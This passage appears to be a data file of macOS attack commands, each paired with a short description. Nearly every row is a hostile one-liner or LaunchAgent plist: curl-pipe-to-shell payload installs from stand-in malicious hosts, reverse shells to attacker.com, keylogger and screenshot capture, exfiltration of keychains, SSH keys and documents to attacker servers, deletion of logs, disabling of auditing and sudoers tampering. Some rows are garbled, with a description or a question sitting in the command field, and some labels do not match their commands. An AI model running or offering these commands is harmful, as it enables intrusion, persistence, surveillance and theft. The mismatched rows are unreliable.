	<integer>3600</integer>
</dict>
</plist>' > ~/Library/.hidden/com.hidden.agent.plist && launchctl load ~/Library/.hidden/com.hidden.agent.plist","Persistence via hidden launch agent that executes a script every hour."
"ps aux","Enumeration of running processes to identify potential targets for unauthorized termination."
"kill -9 <PID>","Terminating a process using its PID without authorization."
"mv malicious_program /usr/local/bin/<legitimate_process_name>","Masquerading a malicious process with the same name as a legitimate system process."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-o</string>
 <string>/tmp/script.sh</string>
 <string>http://malicious-url.com/payload.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
 <key>StartInterval</key>
 <integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file added to LaunchAgents to execute a script every 5 minutes."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script that downloads and executes a payload from a remote server."
"mv /path/to/legitimate/binary /path/to/legitimate/binary.bak && curl -o /path/to/legitimate/binary http://malicious-url.com/trojan && chmod +x /path/to/legitimate/binary","Trojan application execution by replacing an existing legitimate binary with a malicious one."
"cp ~/Library/Application\ Support/Google/Chrome/Default/Cookies /tmp/.hidden_cookies","Credential harvesting script that locates and copies browser cookies to a hidden file."
"git clone https://malicious-phishing-toolkit.com/repo.git && cd repo && python -m SimpleHTTPServer 8080","Phishing toolkit setup by creating a local server to host phishing pages."
"defaults write ~/Library/LaunchAgents/com.example.plist ProgramArguments -array-add '/path/to/malicious/script.sh'","Persistence via Launch Agent by modifying an existing plist to execute a malicious script at login."
"osascript -e 'repeat' -e 'delay 10' -e 'set theText to do shell script ""ioreg -n IOHIDSystem""' -e 'do shell script ""echo "" & theText & "" | nc -u attacker.com 9999""' -e 'end repeat'","Capturing and exfiltrating user keystrokes from a macOS system."
"osascript -e 'do shell script ""echo \""int main() {char large_string[128]; for(int i = 0; i < 200; i++) large_string[i] = 'A'; return 0;}\"" > /tmp/overflow.c && gcc /tmp/overflow.c -o /tmp/overflow && chmod u+s /tmp/overflow && /tmp/overflow"" with administrator privileges'","Gaining root access by exploiting a buffer overflow vulnerability in a privileged program on macOS."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.apple.keyloggerservice</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.apple.keyloggerservice.plist && launchctl load ~/Library/LaunchAgents/com.apple.keyloggerservice.plist","Persistence via malicious plist to install a keylogger"
"curl -o ~/Downloads/keylogger http://untrusted-source.com/keylogger && chmod +x ~/Downloads/keylogger && ~/Downloads/keylogger","Downloading a keylogger application from an untrusted source"
"osascript -e 'do shell script ""sudo cp /path/to/keylogger /usr/local/bin/keylogger && sudo chmod +x /usr/local/bin/keylogger"" with administrator privileges'","Injecting a keylogger to monitor user input"
"0 * * * * /usr/bin/curl -s http://malicious-url.com/script.sh | /bin/bash","A crontab entry that downloads a script from a remote server and executes it every hour."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/script.sh | /bin/bash","Persistence via a malicious cron job that downloads and executes a script every hour."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/keylogger</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistence via malicious plist to execute a keylogger at login."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile","Establishing a reverse shell to maintain remote access."
"nc -l 9999 > incoming_connection","Creating a network listener waiting for incoming connections."
"curl -s http://phishing-url.com/malware.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation through a disguised Bash script downloaded from a phishing email."
"osascript -e 'Tell application ""System Events"" to display dialog ""System Update requires your password:"" default answer """" with hidden answer' > /tmp/credentials.txt","Phishing attack script that masquerades as a system update to trick the user into providing their credentials."
"echo 'alias sudo=""sudo env PATH=$PATH $@ | tee -a /tmp/keystroke.log""' >> ~/.bash_profile","Credential interception by modifying the .bash_profile to capture keystrokes."
"curl -s http://malicious-domain.com/keylogger.sh | bash &>/dev/null","Keylogger installation using a hidden curl command within a seemingly benign script."
"curl -s http://phishing-domain.com/malware.sh > /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh","Malware installation through a disguised Bash script downloaded from a phishing email attachment."
"echo 'script -q /dev/null | cat >> ~/.keystroke_log & disown' >> ~/.bash_profile","Intercepting credentials by injecting a script into the .bash_profile that captures keystrokes."
"echo 'export http_proxy=http://malicious-proxy.com:8080' >> ~/.bashrc && echo 'export https_proxy=http://malicious-proxy.com:8080' >> ~/.bashrc","SSL stripping attack by redirecting traffic through a malicious proxy using a script."
"sudo nvram boot-args=""kextload=/Library/Extensions/malicious.kext""","Persistence via kernel extension loading at boot time."
"echo ""0 * * * * curl -fsSL http://malicious-url.com/script.sh | bash"" | crontab -","Establishing a cron job to download and execute a script every hour."
"echo ""SHELL=/bin/sh\nPATH=/usr/bin:/bin\n1 5 * * * root run-parts --report /etc/cron.hourly"" > /etc/anacrontab","Manipulating anacron to execute a malicious script."
"echo '*/30 * * * * /usr/bin/osascript -e ""do shell script \""sudo -i\"" with administrator privileges""' >> /var/at/tabs/root","Persistence via unauthorized remote login followed by privilege escalation using a cron job to maintain access."
"(crontab -l 2>/dev/null; echo ""* * * * * curl -fsSL http://malicious-url.com/payload.sh | sh"") | crontab -","Persistence via cron job by editing crontab entries to execute a script from a remote server every minute."
"osascript -e 'do shell script ""bash -c \""$(curl -fsSL http://malicious-url.com/payload.sh)\"""" with administrator privileges'","Malicious payload execution via an email attachment disguised as a trusted document, which when opened, executes a shell script embedded within."
"osascript -e 'tell app ""Finder"" to set frontmost of process ""Preview"" to true' -e 'tell app ""System Events"" to keystroke ""r"" using {command down}' -e 'tell app ""System Events"" to keystroke "" /path/to/malicious/script.sh""' -e 'tell app ""System Events"" to keystroke return'","A trojan is being distributed via email attachments that exploit vulnerabilities in document readers to execute a malicious payload."
"open ~/Downloads/malicious_attachment.dmg && xattr -d com.apple.quarantine ~/Downloads/malicious_app.app && ~/Downloads/malicious_app.app/Contents/MacOS/malicious_executable","Malware installation through the execution of a malicious payload received via email attachment."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.sniffer</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/sudo</string>
		<string>/usr/sbin/tcpdump</string>
		<string>-i</string>
		<string>en0</string>
		<string>-w</string>
		<string>/tmp/sniffer.pcap</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.sniffer.plist && launchctl load ~/Library/LaunchAgents/com.malicious.sniffer.plist","Persistence via malicious plist to execute a network traffic sniffer on system startup."
"sudo rm -rf /var/log/*","Unauthorized access to a macOS system followed by deletion of system logs to cover tracks."
"sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.auditd.plist","Disabling audit logs to prevent recording of future actions on the system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/backdoor.sh</string>
		<string>http://malicious-url.com/backdoor.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist for remote access."
"osascript -e 'do shell script ""echo 'launchctl load /Library/LaunchDaemons/com.exploit.agent.plist' && echo 'chmod 644 /Library/LaunchDaemons/com.exploit.agent.plist' && echo 'chown root:wheel /Library/LaunchDaemons/com.exploit.agent.plist'"" with administrator privileges'","Persistence via malicious plist file to exploit a use-after-free vulnerability in macOS kernel for privilege escalation."
"while inotifywait -r -e modify,create,delete /target/directory; do cp /target/directory/* /hidden/.backup/; done","An attacker is using a shell command to monitor file system changes and copy modified files to a hidden directory."
"osascript -e 'do shell script ""curl -s http://malicious-url.com/payload.dmg -o ~/Downloads/payload.dmg && hdiutil attach ~/Downloads/payload.dmg && cp /Volumes/Payload/payload.app ~/Applications/ && open -a ~/Applications/payload.app"" with administrator privileges'","A macOS system received an email with an attachment that disguises itself as a document but executes a malicious payload when opened."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist to maintain access to a macOS system."
"tar cvf - /path/to/sensitive/data | gzip -c | openssl enc -aes-256-cbc -e -k password > /output/path/secure-archive.gz.enc","Data exfiltration by compressing sensitive files into a password-protected archive using gzip on a macOS system."
"zip -er keychains.zip ~/Library/Keychains && openssl base64 < keychains.zip | mail -s 'Encrypted Keychains' recipient@example.com","Extracting and emailing local keychain databases to an external recipient using encrypted email."
"sudo tcpdump -i en0 -w ~/Desktop/captured_packets.pcap","Capturing network packets for analysis on a macOS system."
"tcpdump -nnXSs 0 -i en0 'port 443'","Analyzing encrypted traffic to identify data exfiltration."
"sudo tcpdump -i en0 | nc -l 9999","Redirecting network traffic to a remote server for monitoring."
"curl -s http://example.com/malicious-script | sh","Malware installation using a disguised curl command to fetch and execute a script."
"curl -sO http://example.com/exploit.tar.gz && tar -xzf exploit.tar.gz && ./exploit/run.sh","Exploit kit execution by decompressing a downloaded archive and running an embedded script."
"echo ""* * * * * /usr/bin/curl http://c2.example.com/checkin"" | crontab -","Establishing command and control communication by adding a cron job to periodically connect to a remote server."
"cat /etc/passwd | base64 | curl -X POST -d @- http://example.com/exfil","Traffic obfuscation by using base64 encoding for data exfiltration."
"osascript -e 'do shell script ""launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist"" with administrator privileges'","Persistence mechanism using scripting additions to load malicious code at startup."
"curl -s http://malicious-domain.com/fake-update.sh | sh","Malware installation through a fake software update prompt executed in the terminal."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised curl command to download and execute a script."
"echo 'echo ""malicious code"" > /etc/malicious_file' | sudo sh","Rootkit embedding by appending a malicious script to an existing system file."
"cat /etc/passwd > ~/.hidden_passwd_backup","Creation of a hidden file storing sensitive data extracted from the system."
"nohup nc -l 4444 > /dev/null 2>&1 &","Setting up a stealth network service to listen for incoming connections."
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via scripting additions in macOS."
"curl -s http://malicious-url.com/install.sh | sh","Malware installation using a disguised script from a remote server."
"curl -o /tmp/rootkit.kext http://malicious-url.com/rootkit.kext && sudo chown -R root:wheel /tmp/rootkit.kext && sudo kextload /tmp/rootkit.kext","Rootkit embedding through a downloaded kernel extension."
"sudo kextutil -t /path/to/malicious.kext","Kernel module injection using a malicious loadable kernel module."
"echo 'malicious_code' | sudo dd of=/dev/kmem","Kernel memory manipulation by directly writing to /dev/kmem."
"sudo tcpdump -i en0 -w ~/Desktop/captured_packets.pcap","Capturing network packets on a macOS system to analyze traffic for sensitive data."
"find ~/Documents -name '*.pdf' -exec echo {} \; | mail -s 'Confidential Documents' attacker@example.com","Exfiltrating confidential documents by emailing them to an external address."
"ps aux | grep -i 'security_tool_name' | awk '{print $2}' | xargs kill -9","A scenario where the system monitoring process list is enumerated to identify security tools that could be terminated to avoid detection."
"pkill -f 'process_name_to_terminate'","A method for an unauthorized user to terminate specific processes to weaken system security."
"launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Installing a malicious daemon on macOS to establish persistence."
"defaults write ~/Library/LaunchAgents/com.example.agent.plist ProgramArguments -array-add '/path/to/malicious/script.sh'","A persistence mechanism that involves modifying an existing launch agent plist file to execute a malicious script at system startup."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.startup</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/local/bin/malicious_executable</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.startup.plist && launchctl load ~/Library/LaunchAgents/com.malicious.startup.plist","Creating a new startup script that runs a downloaded malicious executable every time the system boots."
"echo '*/5 * * * * curl -fsSL http://unauthorized-source.com/script.sh | /bin/bash' | crontab -","Setting up a cron job to execute a shell script from an unauthorized source every five minutes."
"chmod u+s /path/to/unauthorized/binary","Privilege escalation by setting the SUID bit on an unauthorized binary to run with root permissions."
"echo 'curl -fsSL http://malicious-url.com/remote.sh | bash' > /Applications/ImageEdit.app/Contents/MacOS/run.sh && chmod +x /Applications/ImageEdit.app/Contents/MacOS/run.sh","Persistence through trojanized image editing software that executes a remote shell script upon launch."
"curl -s http://malicious-url.com/safari_exploit.pkg > /tmp/exploit.pkg && installer -pkg /tmp/exploit.pkg -target /","Malware installation through a drive-by download exploiting Safari browser vulnerabilities."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.plist</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-o</string>
 <string>/tmp/script.sh</string>
 <string>http://malicious-url.com/payload.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to maintain remote access."
"zip -r /tmp/documents.zip ~/Documents && curl -T /tmp/documents.zip ftp://attacker.com/uploads/","Automatic exfiltration of documents from a macOS system using zip compression before transmission."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.backdoor.agent</string><key>ProgramArguments</key><array><string>/usr/bin/env</string><string>sh</string><string>-c</string><string>/usr/bin/curl http://attacker.com/backdoor.sh | /bin/sh</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>' > ~/Library/LaunchAgents/com.backdoor.agent.plist && launchctl load ~/Library/LaunchAgents/com.backdoor.agent.plist","Persistence via malicious plist to establish a backdoor for remote access and user activity monitoring."
"sox -d -t mp3 http://malicious-url.com/recording.mp3 trim 0 10 && curl --upload-file ./recording.mp3 http://malicious-url.com/upload","Capture and exfiltrate audio recordings from the macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.keylogger</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/python</string>
		<string>/tmp/keyboardLogger.py</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>60</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.malicious.keylogger.plist","Persistent keyboard input logging using a malicious daemon on macOS."
"osascript -e 'do shell script ""curl -s http://malicious-url.com/trojan-payload.dmg -o /tmp/trojan-payload.dmg && hdiutil attach /tmp/trojan-payload.dmg && cp -R /Volumes/TrojanPayload/Trojan.app /Applications/ && hdiutil detach /Volumes/TrojanPayload && open /Applications/Trojan.app"" with administrator privileges'","Infection of macOS system through a macro-enabled document received via email, which executes a trojan payload when opened."
"echo '* * * * * root /path/to/malicious/script.sh' >> /etc/crontab","Privilege escalation by injecting a script into system-wide cron directories for persistence."
"TF=$(mktemp) && echo 'ALL ALL=(ALL) NOPASSWD: ALL' > $TF && sudo visudo -cf $TF && if sudo visudo -cf $TF; then sudo visudo -f $TF; fi","Exploiting sudo misconfigurations to escalate privileges on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/malicious.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file creation for launch agents."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.plist</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/python</string>
 <string>/path/to/heap_spray.py</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to execute a heap spraying attack exploiting a use-after-free vulnerability for privilege escalation."
"while true; do screencapture -x ~/Library/Caches/screenshot_$(date '+%Y%m%d%H%M%S').png; sleep 300; done & curl -T ~/Library/Caches/*.png ftp://attacker.com/uploads/","Automated screen capture script to exfiltrate data from a macOS system."
"sudo kextload /Library/Extensions/malicious_extension.kext","Persistence via a malicious kernel extension loaded at boot time."
"sudo profiles -I -F /path/to/malicious.mobileconfig","Installation of a malicious configuration profile to change system settings."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee -a /etc/sudoers","Modification of the sudoers file to grant unauthorized admin privileges."
"0 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash","Persistence via cron job to download and execute a script every hour."
"echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config && /usr/bin/ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa && cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys","Modifying the SSH configuration to allow password authentication and setting up an SSH key for unauthorized access."
"scp ~/.ssh/id_rsa user@remote-server:/path/to/upload","Exfiltrating SSH private keys to a remote server."
"bash -i >& /dev/tcp/remote-server/8080 0>&1","Setting up remote access by installing a reverse shell."
"echo 'bash -i >& /dev/tcp/remote-server/8080 0>&1' | base64 | bash","Initiating a reverse shell with obfuscated shellcode."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/payload.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launchd by loading a malicious agent to execute a payload script periodically."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist that establishes a reverse shell on system startup."
"scp ~/.ssh/id_rsa user@remote-server:/path/to/store/keys","Exfiltrating SSH private keys to a remote server."
"openssl enc -aes-256-cbc -in /path/to/payload -out /tmp/encrypted_payload -pass pass:YourPassword && chmod +x /tmp/encrypted_payload && /tmp/encrypted_payload","Encrypting a payload before executing it to evade detection."
"0 * * * * /usr/bin/curl -s http://malicious-url.com/script.sh | /bin/bash","Persistence via cron job to download and execute a script every hour."
"osascript -e 'do shell script ""chmod +s /bin/bash"" with administrator privileges'","Privilege escalation by exploiting patched kernel vulnerability CVE-2021-30807 on macOS system."
"sudo kextload /Library/Extensions/malicious.kext","Persistence via malicious kernel extension loaded at boot time."
"profiles -I -F /path/to/malicious.mobileconfig","Installing a malicious configuration profile to change system settings."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-s</string>
		<string>http://malicious-url.com/script.sh</string>
		<string>|</string>
		<string>/bin/bash</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > /Library/LaunchDaemons/com.malicious.daemon.plist && launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Creating a launch daemon to execute a script periodically."
"while true; do screencapture -x ~/Library/.hidden/$(date +%Y%m%d%H%M%S).png; sleep 60; done","A script that takes screenshots of the user's screen every minute and saves them with a timestamp in a hidden directory."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/malicious.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious plist file to maintain access to a macOS system."
"Persistence via malicious plist to execute a keylogger at login.","A scenario where a keylogger is installed via a trojanized application to capture user input."
"echo 'echo ""while true; do cat /dev/input/event0 > /tmp/input-logs.txt; done"" >> ~/.login' > ~/Library/LaunchAgents/com.hidden.keylogger.plist && launchctl load ~/Library/LaunchAgents/com.hidden.keylogger.plist","What does the malicious code snippet look like for that scenario?"
"osascript -e 'set volume input volume 100' && while :; do sox -d -t mp3 - | curl -F 'voice=@-' http://attacker.com/upload.php; sleep 300; done","Activating the microphone remotely on a macOS system for monitoring purposes."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /etc/apache2/other/httpd-default.conf && apachectl restart","Persistence mechanism using default Apache server configurations on macOS to maintain remote access."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/RemoteAccessTool.app"", hidden:false}'","Persistence via login item addition using AppleScript to open a remote access tool at login."
"function sudo() { curl http://malicious-url.com/evilscript.sh | bash; } && export -f sudo","Privilege escalation by exploiting sudo misconfigurations through alias and function overrides to create a fake sudo command."
"osascript -e 'do shell script ""curl http://malicious-url.com/payload.sh -o ~/Library/Scripts/payload.sh && chmod +x ~/Library/Scripts/payload.sh && ~/Library/Scripts/payload.sh"" with administrator privileges'","Malware installation via a trojanized document received through email that executes a shell command when opened."
"openssl enc -aes-256-cbc -salt -in ~/Documents/targetfile.doc -out ~/Documents/encryptedfile.enc && crontab -l | { cat; echo ""0 3 * * * openssl enc -aes-256-cbc -d -in ~/Documents/encryptedfile.enc | nc -w 3 attacker.com 4444""; } | crontab -","Automatic transmission of documents from a macOS system using a scheduled cron job with prior encryption of data."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.plist</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/curl</string>
		<string>-o</string>
		<string>/tmp/script.sh</string>
		<string>http://malicious-url.com/payload.sh</string>
		<string>;</string>
		<string>/bin/bash</string>
		<string>/tmp/script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file to maintain remote access."
"osascript -e 'repeat' -e 'delay 10' -e 'set theApps to """"' -e 'set theList to the name of every process whose visible is true' -e 'repeat with theItem in theList' -e 'set theApps to theApps & theItem & "",""' -e 'end repeat' -e 'do shell script ""echo "" & theApps & "" >> ~/Library/Logs/app_usage.log""' -e 'end repeat'","Data exfiltration through keylogging and recording application usage to identify frequently used applications."
"screencapture -x ~/Desktop/screenshot.jpg && osascript -e 'set the clipboard to (read (POSIX file ""~/Desktop/screenshot.jpg"") as JPEG picture)'","Automated screen capture and clipboard image extraction for data exfiltration on a macOS system."
"defaults read com.apple.finder.plist ClipboardHistory | grep -Eo '~[^ ]+\.png' | xargs -I{} cp {} ~/Desktop/clipboard_images/","Extracting the history of images copied to the clipboard on macOS."
"sudo kextload /Library/Extensions/malicious.kext","Persistence through a malicious kernel extension loaded at boot time."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/Applications/malicious.app"", hidden:false}'","Adding a login item to execute a script every time the user logs in."
"sudo defaults write com.apple.loginwindow LoginHook /path/to/script.sh","Creating a login hook to run a script when any user logs in."
"echo 'malicious.com ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7' >> ~/.ssh/known_hosts","Persistence via SSH known hosts poisoning to redirect users to malicious servers."
"ssh -fN -R 2222:localhost:22 user@malicious.com","Establishing a reverse SSH tunnel for port forwarding to allow unauthorized access to internal services."
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD...' >> ~/.ssh/authorized_keys","Abusing SSH to maintain persistent remote access by adding an unauthorized public key to the authorized_keys file."
"mkdir -p ~/Library/LaunchAgents && echo '{""Label"":""com.malicious.agent"",""ProgramArguments"":[""/usr/bin/curl"",""-o"",""/tmp/malicious.sh"",""http://malicious-url.com/script.sh"",""&&"",""chmod"",""+x"",""/tmp/malicious.sh"",""&&"",""/tmp/malicious.sh""],""RunAtLoad"":true}' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence mechanism using a launch agent to execute a script every log in."
"osascript -e 'do shell script ""launchctl load /Library/LaunchDaemons/com.malicious.plist"" with administrator privileges'","Injecting code into a privileged process to escalate privileges on a macOS system."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
